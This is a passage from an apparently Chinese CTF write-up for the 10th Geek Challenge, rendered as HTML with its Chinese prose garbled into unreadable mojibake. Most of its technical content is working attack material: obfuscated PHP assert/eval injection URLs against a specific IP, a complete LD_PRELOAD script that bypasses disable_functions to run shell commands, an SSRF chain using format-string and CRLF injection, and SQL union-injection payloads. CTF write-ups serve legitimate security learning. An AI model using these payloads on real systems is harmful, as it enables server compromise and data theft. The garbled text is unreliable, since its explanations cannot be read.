class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571497597408.png" alt="1571497597408"></p><p>æŸ¥çœ‹æŸäº›å…³é”®å‚æ•°</p><ul><li>â€‹    å¦‚ç³»ç»Ÿä¿¡æ¯</li></ul><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571499066521.png" alt="1571499066521"></p><ul><li>disable_functions</li></ul><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571499768310.png" alt="1571499768310"></p><p>å‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½è¢«ç¦æ­¢äº†</p><ul><li>allow_url_*</li></ul><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571498825445.png" alt="1571498825445"></p><p>å…³äºè¿™ä¸¤ä¸ªå‚æ•°å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« <a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">phpä¼ªåè®®</a></p><ul><li>sendmail_*</li></ul><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571499021494.png" alt="1571499021494"></p><ul><li>open_basedir</li></ul><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571500306817.png" alt="1571500306817"></p><p>å¹¶æ²¡æœ‰é™åˆ¶æˆ‘ä»¬ç›®å½•ã€‚å¦‚æœæœ‰å¯ä»¥å‚è€ƒè¿™ç¯‡<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/" target="_blank" rel="noopener">æ–‡ç« </a>ç»•è¿‡</p><p>æ—¢ç„¶ä¸èƒ½æ‰§è¡Œå‘½ä»¤é‚£å°±ç”¨var_dump(scandir())æ¥æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=var_dump(scandir(%27/tmp/%27));</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571501644752.png" alt="1571501644752"></p><p>ä½†æ„Ÿè§‰æŒºéº»çƒ¦çš„ï¼Œåé¢é˜Ÿå‹æäº†ä¸ªè¿™ä¸ª(èººç€çœŸèˆ’æœ )ï¼Œç›´æ¥èšå‰‘è¿(èœåˆ€ä¸è¡Œ)</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571502520704.png" alt="1571502520704"></p><p>å‘ç°ä¸»ç›®å½•ä¸‹æœ‰æœ‰flagå’Œreadflagï¼Œflagåªèƒ½rootæ‰èƒ½æŸ¥çœ‹</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571502747158.png" alt="1571502747158"></p><p>æŠŠreadflagä¸‹è½½ä¸‹æ¥ï¼Œåç¼–è¯‘äº†ä¸€ä¸‹</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571502795907.png" alt="1571502795907"></p><p>é‚£ä¹ˆæ€è·¯ä¹Ÿå°±æ¸…æ™°èµ·æ¥äº†ï¼Œbypass disable_functions  æ‰§è¡Œreadflag</p><p>æˆ‘ä»¬è¿™é‡Œåˆ©ç”¨LD_PRELOADåŠ«æŒå…±äº«åº“ï¼Œä»è€Œæ‰§è¡Œå‘½ä»¤</p><p>å…·ä½“åŸç†çœ‹çœ‹<a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">å‡ºé¢˜äººçš„åšå®¢</a>å’Œ<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">bypass_disablefunc_via_LD_PRELOAD</a></p><p>é¦–å…ˆä¸Šä¼ æ¶æ„soæ–‡ä»¶ï¼Œä¸Šé¢çš„githubé¡¹ç›®ä¸­æœ‰ï¼Œæ³¨æ„æ“ä½œç³»ç»Ÿä½æ•°</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571503296101.png" alt="1571503296101"></p><p>å¹¶ä¸”é‡å‘½åä¸º123.so</p><p>ç„¶åä¸Šä¼ 123.phpæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡include()åŒ…å«æ–‡ä»¶ï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=include(%27/tmp/123.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/123.so</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/1571503618681.png" alt="1571503618681"></p><h2 id="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µï¼šTalk-is-easy-show-me-the-code"><a href="#æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µï¼šTalk-is-easy-show-me-the-code" class="headerlink" title="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µï¼šTalk is easy ,show me the code."></a>æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬ä¸€é¡µï¼šTalk is easy ,show me the code.</h2><p>è®¿é—®é¢˜ç›®é¡µé¢ï¼Œç»™äº†æºç </p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    ini_set(<span class="string">"max_execution_time"</span>, <span class="string">"60"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">empty</span>($_GET[<span class="string">"url"</span>]) &amp;&amp; <span class="keyword">die</span>();</span><br><span class="line">    $password = <span class="string">"If I knew where I would die, I would never go there."</span>;</span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $password);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">startsWith</span><span class="params">($haystack, $needle)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         $length = strlen($needle);</span><br><span class="line">         <span class="keyword">return</span> (substr($haystack, <span class="number">0</span>, $length) === $needle);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $url = $_GET[<span class="string">"url"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!startsWith($url,<span class="string">"http://"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not allow !"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($arr); $i++)  </span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">3</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">false</span>);</span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        curl_close($ch);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ($output === $arr[$i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($i == sizeof($arr)<span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Congratulations. Flag is  SYC&#123;********************************&#125;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"password is wrong"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨å…·æœ‰å…¬ç½‘IPçš„æœåŠ¡å™¨ä¸Šï¼Œæ”¾ç½®ä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶</p><p>req.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"If I knew where I would die, I would never go there."</span>;</span><br><span class="line">$arr = explode(<span class="string">' '</span>, $password);</span><br><span class="line">$count=intval(file_get_contents(<span class="string">"1.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> $arr[$count];</span><br><span class="line"></span><br><span class="line">$count++;</span><br><span class="line">$file=fopen(<span class="string">"1.txt"</span>,<span class="string">"w+"</span>);</span><br><span class="line">fwrite($file,$count);</span><br><span class="line">fclose($file);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1.txt</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101124245849.png" alt="image-20191101124245849"></p><p>1.txtè¦æœ‰å¯å†™æƒé™</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101124431268.png" alt="image-20191101124431268"></p><h2 id="æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿï¼šemmï¼Œè‡ªå·±çœ‹"><a href="#æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿï¼šemmï¼Œè‡ªå·±çœ‹" class="headerlink" title="æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿï¼šemmï¼Œè‡ªå·±çœ‹"></a>æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿï¼šemmï¼Œè‡ªå·±çœ‹</h2><p>SSRFè¿˜æ²¡æœ‰å†™è¿‡é¢˜ç›®ï¼Œåˆ©ç”¨å¤ç°å­¦ä¹ ä¸€ä¸‹</p><p>é¦–å…ˆæœ‰ä¸ªadmin.php</p><p>ä½†è¦æ±‚127.0.0.1æ‰èƒ½è®¿é—®</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191211164956360.png" alt="image-20191211164956360"></p><p>æœ‰index.phpçš„æºç ï¼Œ</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191211164910208.png" alt="image-20191211164910208"></p><p>è¿™é‡Œåˆ©ç”¨index.php SSRFè®¿é—®admin.php</p><p>ä½†è¦ç»•è¿‡â€œ/anythingâ€</p><p>è¿™é‡Œå¯ä»¥æ„é€ url=<a href="http://127.0.0.1/admin.php?&amp;method=GET" target="_blank" rel="noopener">http://127.0.0.1/admin.php?&amp;method=GET</a></p><p>è¿™æ ·â€œ/anythingâ€ å°±æˆäº†ä¸€ä¸ªå‚æ•°</p><p>æ˜¾ç¤ºfailedæ˜¯å› ä¸ºé‡‡ç”¨GETè¯·æ±‚æ–¹å¼ï¼ŒæœåŠ¡ç«¯æ˜¯ä¸ä¼šè¿”å›Allowå¤´çš„ï¼Œè€Œä¸”è¿™é‡Œçš„SSRFæ²¡æœ‰å›æ˜¾ï¼Œåªæœ‰ä¸€ä¸ªæ˜¾ç¤ºå“åº”ä½“é•¿åº¦çš„è¯­å¥</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191211195729531.png" alt="image-20191211195729531"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sprintf</span>(<span class="string">"body length of $method%d"</span>, $body);</span><br></pre></td></tr></table></figure><p>è¿™å¥ $methodå¯æ§ï¼Œæ‰€ä»¥ä¼ å…¥%s% è¦†ç›–å %s%%d åŒç™¾åˆ†å·è¿”å›ä¸€ä¸ª%,ä½†è¿™æ—¶ %d å·²ç»æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191211202422540.png" alt="image-20191211202422540"></p><p>å¾—åˆ°admin.phpçš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"127.0.0.1"</span>) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> (@$_POST[<span class="string">"iwantflag"</span>] == <span class="string">"yes"</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"only 127.0.0.1 can visit it"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³äºHTTPå¤´</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">httpå¤´çš„æ ¼å¼ï¼š</span><br><span class="line"></span><br><span class="line">è¯·æ±‚æ–¹æ³• /è·¯å¾„ HTTP/ç‰ˆæœ¬</span><br><span class="line">å¤´å­—æ®µ: å€¼</span><br><span class="line"></span><br><span class="line">æ¯”å¦‚ï¼š</span><br><span class="line">GET /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>httpå¤´éƒ¨çš„å„ä¸ªå­—æ®µä¹‹é—´ç”¨CRLF(\r\n)(%0d%0a)åˆ†å‰²<br>httpè¯·æ±‚å¤´(å“åº”å¤´)å’Œè¯·æ±‚ä½“(å“åº”ä½“)ä¹‹é—´ç”¨ä¸¤ä¸ªCRLFåˆ†å‰²</p><p>å…³äºHttpè¯·æ±‚</p><p>getè¯·æ±‚:</p><pre><code>GET / HTTP/1.1Host: 127.0.0.1</code></pre><p>postè¯·æ±‚</p><pre><code>POST / HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-from-urlencodedContent-Length: 3x=1</code></pre><p>httpå¤´çš„å­—æ®µï¼ˆå¸¸è§ï¼‰<br>        Host</p><pre><code>ç”¨äºå¤šä¸ªåŸŸåæ˜ å°„åˆ°åŒä¸€ä¸ªipæ—¶ï¼ŒæŒ‰ç…§Hostçš„å†…å®¹åŒ¹é…ä¸åŒç½‘ç«™å†…å®¹ï¼Œæ¯ä¸ªHttpå¤´å¿…é¡»æœ‰Hostå¤´å½“è¿™ä¸ªç›®çš„ä¸»æœºä¸Šåªæœ‰ä¸€ä¸ªç½‘ç«™ï¼Œé‚£ä¹ˆHostå­—æ®µå†…å®¹å¯ä»¥ä¸ºä»»æ„å€¼</code></pre><p>Content-Type</p><p>è¡¨æ˜å†…å®¹éƒ¨åˆ†çš„ç¼–ç æ ¼å¼å’Œåª’ä½“ç±»å‹ post/putç­‰æ–¹å¼å¿…é¡»æœ‰(å¦‚æœæœ‰è¯·æ±‚ä½“)</p><p>è¯·æ±‚å¤´ä¸­çš„Content-Type<br>GETè¯·æ±‚:<br>GETæ²¡æœ‰è¯·æ±‚å®ä½“éƒ¨åˆ†ï¼Œæ‰€ä»¥è¯·æ±‚å¤´ä¸­ä¸éœ€è¦è®¾ç½®Content-Typeå­—æ®µ<br>POST/PUTè¯·æ±‚<br>å¦‚æœpost/putè¯·æ±‚æœ‰è¯·æ±‚ä½“(æœ‰ä¼ å€¼)ï¼Œé‚£ä¹ˆå¿…é¡»è¦è®¾ç½®Content-Typeå­—æ®µ(å¦åˆ™æœåŠ¡ç«¯å¯èƒ½æ— æ³•å¤„ç†ä½ çš„è¯·æ±‚)</p><pre><code>ç¬¬ä¸€ç±»ï¼šrawåŸå§‹ç±»å‹ï¼Œå¯ä»¥ä¸Šä¼ ä»»æ„æ ¼å¼çš„æ–‡æœ¬ï¼Œæ¯”å¦‚textã€jsonã€xmlã€htmlâ€¦(ä¸­æ–‡ä¸è¿›è¡Œç¼–ç )textè¯·æ±‚ï¼šContent-Type: text/plainjsonè¯·æ±‚ï¼šContent-Type: application/jsonhtmlè¯·æ±‚ï¼šContent-Type: text/htmlç¬¬äºŒç±»ï¼šapplication/x-www-from-urlencodedï¼Œä¼šå°†è¡¨å•å†…çš„æ•°æ®è½¬æ¢æ‹¼æ¥æˆkey-valueå¯¹(å¯¹éasciiç è¿›è¡Œç¼–ç )Content-Type: application/x-www-from-urlencodedç¬¬ä¸‰ç±»ï¼šmultipart/from-dataï¼Œå°†è¡¨å•çš„æ•°æ®å¤„ç†ä¸ºä¸€æ¡æ¶ˆæ¯ï¼Œä»¥æ ‡ç­¾ä¸ºå•å…ƒï¼Œç”¨åˆ†éš”ç¬¦åˆ†å¼€ã€‚æ—¢å¯ä»¥ä¸Šä¼ é”®å€¼å¯¹ï¼Œä¹Ÿå¯ä»¥ä¸Šä¼ æ–‡ä»¶ã€‚Content-Type: multipart/from-data;boundary=xxxåœ¨è¯·æ±‚ä½“ä¸­ä¼šæœ‰ä¸€ä¸ªContent-Dispositionå­—æ®µï¼Œç”¨äºæè¿°æäº¤çš„è¡¨å•çš„å…·ä½“ä¿¡æ¯</code></pre><p>å“åº”å¤´ä¸­çš„Content-Typeï¼š<br> ç”¨æ¥å‘Šè¯‰å®¢æˆ·ç«¯ï¼ŒæœåŠ¡ç«¯è¿”å›çš„çœŸå®å†…å®¹ç±»å‹æ˜¯ä»€ä¹ˆã€‚æµè§ˆå™¨æˆ–å®¢æˆ·ç«¯ä¼šæ ¹æ®è¿™ä¸ªå€¼æ¥åšä¸€äº›æ“ä½œã€‚</p><p> Content-Length è¡¨ç¤ºå†…å®¹éƒ¨åˆ†çš„é•¿åº¦ post/putç­‰æ–¹å¼å¿…é¡»æœ‰(å¦‚æœæœ‰è¯·æ±‚ä½“)</p><p>åœ¨æºç ä¸­ä½¿ç”¨çš„æ˜¯stream_context_create()å‡½æ•°å‘èµ·HTTPè¯·æ±‚</p><p>è¿™é‡Œå¦‚httpåè®®å¤´ç­‰ä¸€äº›ä¿¡æ¯ï¼Œä½œä¸ºä¸€ä¸ªæ•°ç»„ä¼ å…¥ã€‚æ‰€ä»¥æˆ‘ä»¬èƒ½åˆ©ç”¨CRLFæ„é€ ä¸€ä¸ªæ–°çš„POSTåŒ…</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191212220127675.png" alt="image-20191212220127675"></p><p>è¿™é‡Œæˆ‘ä»¬æŠŠurlæ”¹æˆè‡ªå·±æœåŠ¡å™¨çš„ipï¼Œçœ‹çœ‹ç»è¿‡å¤„ç†åçš„POSTæ˜¯ä»€ä¹ˆæ ·å­ã€‚</p><p>è¿™ä¸ªPOSTåŒ…æœ€åä¹ŸåŠ ä¸Šäº†ä¸€äº›å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¸ºäº†é˜²æ­¢iwantflagå‚æ•°è¢«æ±¡æŸ“ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°b</p><p>è€Œä¸”ä¸ºäº†ä»index.phpå¾—åˆ°å›æ˜¾ï¼Œæˆ‘ä»¬ä¾æ—§è¦è¦†ç›– %d æ‰€ä»¥id=%s% </p><p>è¿˜æœ‰ä¸€ç‚¹ï¼Œ&amp;åœ¨URLä¸­æ˜¯å…·æœ‰åˆ†å‰²å‚æ•°çš„ä½œç”¨ï¼Œæ‰€ä»¥è¦è¿›è¡ŒURLç¼–ç </p><p>æœ€åçš„payloadå¦‚ä¸‹</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191212074711793.png" alt="image-20191212074711793"></p><h2 id="Lovelysqlï¼šä¸Šæ¬¡æ˜¯æˆ‘ç²—å¿ƒå¤§æ„ï¼Œçœ‹æ¥ä¸èƒ½ç›´æ¥æ”¾åœ¨ç½‘é¡µä¸Šäº†ï¼"><a href="#Lovelysqlï¼šä¸Šæ¬¡æ˜¯æˆ‘ç²—å¿ƒå¤§æ„ï¼Œçœ‹æ¥ä¸èƒ½ç›´æ¥æ”¾åœ¨ç½‘é¡µä¸Šäº†ï¼" class="headerlink" title="Lovelysqlï¼šä¸Šæ¬¡æ˜¯æˆ‘ç²—å¿ƒå¤§æ„ï¼Œçœ‹æ¥ä¸èƒ½ç›´æ¥æ”¾åœ¨ç½‘é¡µä¸Šäº†ï¼"></a>Lovelysqlï¼šä¸Šæ¬¡æ˜¯æˆ‘ç²—å¿ƒå¤§æ„ï¼Œçœ‹æ¥ä¸èƒ½ç›´æ¥æ”¾åœ¨ç½‘é¡µä¸Šäº†ï¼</h2><p>ç†Ÿæ‚‰çš„ç•Œé¢</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101125127520.png" alt="image-20191101125127520"></p><p>åŒæ ·çš„æ‰‹æ³•</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">â€˜</span>=<span class="string">â€™</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">â€˜=â€™</span></span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101201215464.png" alt="image-20191101201215464"></p><p>ä½†è¿™ä¸ªå­—ç¬¦ä¸²å¹¶ä¸æ˜¯flagï¼Œä¼°è®¡åœ¨æ•°æ®åº“ä¸­</p><p>åˆ©ç”¨Payloadæµ‹è¯•ï¼Œç¦ç”¨äº† insertï¼Œhavingç­‰ï¼Œå¯ä»¥åˆ©ç”¨<code>#</code> é—­åˆã€‚</p><p>å¯ä»¥è”åˆæ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥ï¼Œç›²æ³¨ã€‚</p><p>è¿™é‡Œç”¨æœ€ç®€å•çš„è”åˆæ³¨å…¥ã€‚</p><p>å…ˆåˆ¤æ–­å­—æ®µæ•°</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101202502733.png" alt="image-20191101202502733"></p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101202533747.png" alt="image-20191101202533747"></p><p>å­—æ®µæ•°ä¸º3</p><p>è·å–å›æ˜¾ç‚¹</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101203249710.png" alt="image-20191101203249710"></p><p>è·å–æ•°æ®åº“å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(schema_name)+from+information_schema.schemata%23&amp;password=123</span><br></pre></td></tr></table></figure><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191101203821862.png" alt="image-20191101203821862"></p><p>å…ˆå…³æ³¨geekæ•°æ®åº“ï¼ŒæŸ¥è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 